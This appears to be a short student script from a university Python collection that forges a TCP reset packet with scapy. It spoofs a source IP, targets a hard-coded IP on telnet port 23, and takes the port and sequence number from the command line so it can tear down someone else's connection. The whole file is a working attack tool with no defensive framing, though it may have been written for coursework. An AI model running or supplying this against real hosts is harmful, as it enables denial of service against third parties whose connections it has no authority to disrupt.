# all-by-pythonself
# by whichmeans
# at Cheongju University
# Snippet for TCP reset attacks

from scapy . all import *

p = IP (dst = "64.13.139.230", src = "117.17.93.80") / TCP (sport = int (sys . argv [1]), dport = 23, seq = int (sys . argv [2]), flags = "R")
send (p)